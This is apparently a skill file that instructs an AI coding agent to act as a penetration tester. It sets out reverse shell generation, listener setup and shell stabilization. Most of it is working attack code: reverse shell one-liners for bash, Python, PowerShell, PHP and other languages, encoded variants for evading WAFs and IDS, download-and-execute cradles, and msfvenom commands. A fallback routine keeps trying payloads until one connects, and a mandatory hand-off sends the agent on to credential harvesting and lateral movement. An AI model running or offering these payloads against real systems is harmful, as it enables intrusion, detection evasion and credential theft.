---
name: reverse-shell
description: |
  Reverse shell generation and listener management. Generates platform-specific reverse shell payloads (bash, python, php, powershell, java, ruby, perl, netcat, socat, msfvenom) and sets up listeners in the Kali container.

  Supports one-liner generation, encoded payloads for WAF/filter bypass, listener setup with session capture, and shell stabilization. Chains from /pentester, /metasploit, or /post-exploit when command execution is confirmed.
argument-hint: <target-ip> <target-port> [lhost=ATTACKER_IP] [lport=4444] [type=bash|python|php|powershell|nc|msfvenom] [encode=base64|url]
user-invocable: true
---

# Reverse Shell Generation & Listener Management

You are an expert penetration tester setting up reverse shell infrastructure. Your goal: generate the right payload for the target platform, set up a reliable listener, and stabilize the shell for interactive use.

**Request:** $ARGUMENTS

---

## Tools Available

| Tool | Use for |
|------|---------|
| `kali(command=...)` | Kali tools: ncat, socat, msfvenom, openssl, base64, python3 |
| `start_metasploit` | Meterpreter multi/handler listener — `session(action="start_metasploit")` |
| `run_metasploit` | Meterpreter handler — `scan(tool="metasploit", ...)` |
| `report(action="note", data={...})` | Write reasoning notes to session log |

---

## CHAIN COMMITMENTS — DECLARE BEFORE STARTING

Read this before generating any payload. Commit to MANDATORY chains before your first tool call.

| Trigger | Chain | Mandatory? | Claude Code | opencode |
|---------|-------|-----------|-------------|---------|
| Shell / Meterpreter session obtained | `/post-exploit` | **MANDATORY** | `Skill(skill="post-exploit")` | `cat ~/.config/opencode/commands/post-exploit.md` |

**You WILL invoke `/post-exploit` the moment a reverse shell connects. Do not spend time manually enumerating — hand off immediately.**


**Logging:** Before invoking any skill above, call `session(action="set_skill", options={"skill":"<name>","reason":"<why>","chained_from":"<this-skill>"})` — this writes the SKILL_CHAIN entry to pentest.log.

---

## Reverse Shell Payload Reference

### Linux Payloads

**Bash (most common):**
```
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```

**Bash — exec variant (avoids /dev/tcp on some distros):**
```
0<&196;exec 196<>/dev/tcp/LHOST/LPORT; bash <&196 >&196 2>&196
```

**Python:**
```
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**Python (short):**
```
python3 -c 'import os;os.system("bash -i >& /dev/tcp/LHOST/LPORT 0>&1")'
```

**Perl:**
```
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

**Ruby:**
```
ruby -rsocket -e'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

**PHP:**
```
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/bash -i <&3 >&3 2>&3");'
```

**Netcat (traditional):**
```
nc -e /bin/bash LHOST LPORT
```

**Netcat (no -e — OpenBSD variant):**
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc LHOST LPORT >/tmp/f
```

**Socat:**
```
socat TCP:LHOST:LPORT EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**Awk:**
```
awk 'BEGIN {s="/inet/tcp/0/LHOST/LPORT"; while(42){printf "> " |& s; s |& getline c; if(c){while((c |& getline) > 0) print $0 |& s; close(c)}}}' /dev/null
```

### Windows Payloads

**PowerShell:**
```
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

**PowerShell (base64 encoded for evasion):**
```
kali(command="echo 'POWERSHELL_PAYLOAD' | iconv -t UTF-16LE | base64 -w0")
# Then: powershell -enc BASE64_STRING
```

**PowerShell (download and execute):**
```
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1')"
```

### Additional Language Payloads

**Golang (compile and run on target):**
```
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","LHOST:LPORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go
```

**Lua:**
```
lua -e "require('socket');require('os');t=socket.tcp();t:connect('LHOST','LPORT');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

**Node.js:**
```
node -e '(function(){var c=require("child_process").spawn("/bin/sh",[]);var n=require("net").connect(LPORT,"LHOST",function(){n.pipe(c.stdin);c.stdout.pipe(n);c.stderr.pipe(n)});})()'
```

**Java (Runtime.exec):**
```
Runtime r = Runtime.getRuntime(); Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do $line 2>&5 >&5; done'");
```

**Groovy:**
```
String host="LHOST";int port=LPORT;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break}catch(Exception e){}};p.destroy();s.close()
```

**Telnet (requires two listeners):**
```
# Attacker: nc -lvp 8080 AND nc -lvp 8081
telnet LHOST 8080 | /bin/sh | telnet LHOST 8081
```

**OpenSSL (encrypted — evades IDS):**
```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect LHOST:LPORT > /tmp/s; rm /tmp/s
```

**Bash UDP (when TCP is blocked):**
```
sh -i >& /dev/udp/LHOST/LPORT 0>&1
# Listener: nc -u -lvp LPORT
```

### Encoded Payloads (WAF/filter bypass)

**Base64 encoded bash:**
```
echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' | base64
# Then: echo BASE64 | base64 -d | bash
```

**URL encoded (for injection into URL parameters):**
```
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FLHOST%2FLPORT%200%3E%261
```

**Hex encoded:**
```
echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' | xxd -p | tr -d '\n'
# Then: echo HEX | xxd -r -p | bash
```

### msfvenom Payloads

**Generate with msfvenom in Kali or Metasploit container:**

| Target | Command |
|--------|---------|
| Linux ELF | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell` |
| Linux Python | `msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw` |
| Windows EXE | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe` |
| Windows PS1 | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f psh -o shell.ps1` |
| PHP | `msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw -o shell.php` |
| JSP | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw -o shell.jsp` |
| WAR | `msfvenom -p java/shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o shell.war` |
| ASP | `msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f asp -o shell.asp` |

---

## Listener Setup

### Simple ncat listener (single catch)

```
kali(command="ncat -lvnp LPORT", timeout=60000)
```

### Background listener with output capture

```
kali(command="ncat -lvnp LPORT > /tmp/shell-output.txt 2>&1 &")
# Run exploit...
kali(command="cat /tmp/shell-output.txt")
```

### Socat listener (auto-TTY)

```
kali(command="socat TCP-LISTEN:LPORT,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane", timeout=60000)
```

### Socat one-shot with timeout

```
kali(command="timeout 30 socat TCP-LISTEN:LPORT,reuseaddr STDOUT")
```

### Meterpreter multi/handler (best for persistent sessions)

```
scan(tool="metasploit", target="TARGET", options={
  "module": "exploit/multi/handler",
  "payload": "linux/x64/shell_reverse_tcp",
  "lhost": "KALI_IP",
  "lport": "4444",
  "extra": "set ExitOnSession false"
})
```

### Encrypted listener (evade IDS)

```
# Generate cert
kali(command="openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 1 -nodes -subj '/CN=localhost'")
# Listener
kali(command="socat OPENSSL-LISTEN:LPORT,cert=/tmp/cert.pem,key=/tmp/key.pem,verify=0,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid")
# Target payload
socat OPENSSL:LHOST:LPORT,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

---

## Shell Stabilization

After catching a reverse shell, stabilize it for interactive use:

**Python TTY upgrade:**
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z to background
stty raw -echo; fg
export TERM=xterm
```

**Script TTY upgrade (if python unavailable):**
```
script -qc /bin/bash /dev/null
# Ctrl+Z to background
stty raw -echo; fg
```

**Socat TTY upgrade (best — full terminal):**
```
# On attacker (listener with TTY):
socat file:`tty`,raw,echo=0 TCP-LISTEN:LPORT
# On target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
```

---

## Workflow

### When invoked standalone

1. Call `report(action="note", data={...})` — record target OS, available access, injection point
2. **Probe available interpreters** on the target (if you have command execution):
   ```
   which bash python3 python perl ruby nc ncat socat lua node php 2>/dev/null
   ```
3. Set up listener in Kali container (keep it running for the full fallback chain)
4. Select the first payload from the fallback chain below and deliver it
5. **If no callback within 10 seconds** — try the next payload in the chain
6. Repeat until a shell connects or all payloads are exhausted
7. Stabilize the shell

### Fallback Chain — Linux

If a payload fails (no callback), try the next one automatically. **Do NOT stop after one failure.**

| Priority | Payload | Why it might fail |
|----------|---------|-------------------|
| 1 | `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` | `/dev/tcp` not compiled in (Debian/Ubuntu default) |
| 2 | `python3 -c 'import socket,os,pty;...'` | python3 not installed |
| 3 | `python -c 'import socket,os,pty;...'` | python2 only on older systems |
| 4 | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc LHOST LPORT >/tmp/f` | nc not installed |
| 5 | `perl -e 'use Socket;...'` | perl not installed |
| 6 | `php -r '$sock=fsockopen("LHOST",LPORT);...'` | php not installed |
| 7 | `ruby -rsocket -e '...'` | ruby not installed |
| 8 | `lua -e "require('socket');..."` | lua not installed |
| 9 | `openssl s_client -quiet -connect LHOST:LPORT` (with mkfifo) | openssl not installed |
| 10 | `sh -i >& /dev/udp/LHOST/LPORT 0>&1` (UDP) | UDP listener needed |
| 11 | msfvenom ELF binary (wget + chmod + execute) | wget/curl needed for download |

**How to implement the fallback:**
```
# Set up ONE listener (keep it running)
kali(command="ncat -lvnp 4444 > /tmp/shell-output.txt 2>&1 &")

# Try bash first
kali(command="python3 /tmp/exploit.py TARGET 'bash -i >& /dev/tcp/LHOST/4444 0>&1'")
kali(command="sleep 5 && cat /tmp/shell-output.txt | head -5")  # check for callback

# No callback? Try python
kali(command="python3 /tmp/exploit.py TARGET 'python3 -c \"import socket,os,pty;s=socket.socket();s.connect((\\\"LHOST\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/bash\\\")\"'")
kali(command="sleep 5 && cat /tmp/shell-output.txt | head -5")  # check again

# Continue down the chain...
```

Call `report(action="note", data={...})` after each attempt recording which payload was tried and the result.

### Fallback Chain — Windows

| Priority | Payload | Why it might fail |
|----------|---------|-------------------|
| 1 | PowerShell reverse shell | Execution policy, AppLocker, AMSI |
| 2 | PowerShell base64 encoded (`-enc`) | Bypasses basic string detection |
| 3 | PowerShell download cradle (`IEX(...)`) | Network restrictions |
| 4 | msfvenom EXE (certutil download) | AV detection |
| 5 | msfvenom PS1 (AMSI bypass + exec) | Stricter AV/EDR |

### When chained from another skill

The calling skill provides:
- Target IP and port where command execution was achieved
- How command execution works (SQLi OS shell, RCE exploit, file upload, etc.)
- Target OS (Linux/Windows)

Set up the listener, run the fallback chain until a shell connects, then return control to the calling skill.

---

## Payload Selection Decision Tree

```
Target OS?
├── Linux
│   ├── bash available?     → Bash TCP (or UDP if TCP blocked)
│   ├── python3 available?  → Python reverse shell
│   ├── perl available?     → Perl reverse shell
│   ├── ruby available?     → Ruby reverse shell
│   ├── nc available?
│   │   ├── nc -e works?    → nc -e /bin/bash
│   │   └── no -e?          → mkfifo + nc pipe
│   ├── socat available?    → Socat PTY reverse shell (best quality)
│   ├── lua available?      → Lua socket reverse shell
│   ├── golang available?   → Go compile-and-run
│   ├── openssl available?  → OpenSSL encrypted shell (evades IDS)
│   ├── telnet available?   → Telnet dual-listener method
│   └── none of above?      → msfvenom ELF binary (download + execute)
│
├── Windows
│   ├── PowerShell?         → PS reverse shell (or base64 encoded for evasion)
│   ├── cmd only?           → msfvenom EXE (download + execute)
│   └── web shell?          → msfvenom ASPX
│
├── Web application
│   ├── PHP?                → PHP fsockopen reverse shell
│   ├── JSP/Java?           → JSP shell or WAR upload
│   ├── Python (Flask)?     → Python reverse shell
│   ├── Node.js?            → child_process reverse shell
│   └── Groovy (Jenkins)?   → Groovy ProcessBuilder shell
│
└── Restricted environment
    ├── TCP blocked?        → Bash UDP or DNS tunnel
    ├── IDS present?        → OpenSSL encrypted or TLS-PSK
    ├── Special chars filtered? → Base64 or hex encoded payload
    └── No outbound?        → Bind shell instead (nc -lvnp PORT -e /bin/bash on target)
```

---

## Chaining Other Skills

| Skill | When to invoke |
|-------|----------------|
| `/post-exploit` | Shell obtained — escalate privileges, harvest credentials |
| `/lateral-movement` | Credentials obtained from shell — move through network |
| `/credential-audit` | Credentials found — crack and test |

---

## Rules

- **Always set up the listener BEFORE delivering the payload**
- **Use background listeners** (`&`) when the calling tool blocks on execution
- **Match the payload to the target** — check what interpreters are available before choosing
- **Try bash first on Linux** — most reliable and widely available
- **Use encoded payloads** when special characters are filtered (URL params, SQL injection, etc.)
- **Prefer Meterpreter** when persistence and session management are needed
- **Stabilize the shell** immediately after catching — unstable shells lose sessions
- **Document the payload used** — call `report(action="note", data={...})` with the exact command for reproducibility
- **Use encrypted channels** (socat OPENSSL) when IDS evasion is required
- **Never leave listeners running** — clean up background listeners when done
